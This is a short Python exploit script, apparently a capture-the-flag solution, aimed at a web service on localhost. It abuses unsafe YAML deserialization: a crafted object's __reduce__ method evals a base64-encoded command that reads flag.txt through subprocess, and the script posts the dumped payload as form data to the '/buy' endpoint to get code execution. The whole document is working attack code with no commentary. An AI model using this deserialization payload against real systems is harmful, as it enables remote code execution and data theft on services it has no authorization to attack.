#!/usr/bin/env python3

import base64
import requests
import subprocess
import yaml

BASE_URL = 'http://localhost:50000'

class Payload(object):
    def __reduce__(self):
        #payload = '__import__("subprocess").getoutput("ls")'
        payload = '__import__("subprocess").getoutput("cat flag.txt")'
        
        # Ensure no padding characters
        slack = 3 - (len(payload) % 3)
        payload += ' '*slack
        assert len(payload) % 3 == 0
        
        b64_payload = base64.b64encode(payload.encode()).decode()
        return (eval,('eval(__import__("base64").b64decode("%s"))' % b64_payload,))

payload = yaml.dump({
    'exploit': Payload(),
    'yam': 0
})

encoded_payload = payload.strip().replace('\n', '&').replace(': ', '=')

r = requests.post(BASE_URL + '/buy', data=encoded_payload, allow_redirects=False)
print(r.text)
